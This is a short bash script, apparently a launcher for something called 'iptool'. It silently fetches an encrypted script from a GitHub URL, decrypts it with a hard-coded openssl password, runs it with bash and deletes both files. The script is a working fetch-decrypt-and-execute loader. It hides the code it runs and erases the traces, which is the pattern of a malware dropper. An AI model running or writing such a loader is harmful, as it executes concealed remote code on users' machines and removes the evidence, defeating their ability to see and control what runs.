
#!/bin/bash
curl -s https://raw.githubusercontent.com/acor1/iptool-public/main/iptool.sh.enc -o /tmp/iptool.sh.enc
openssl enc -aes-256-cbc -d -in /tmp/iptool.sh.enc -out /tmp/iptool.sh -k 'RunFastSecure123'
bash /tmp/iptool.sh
rm /tmp/iptool.sh /tmp/iptool.sh.enc
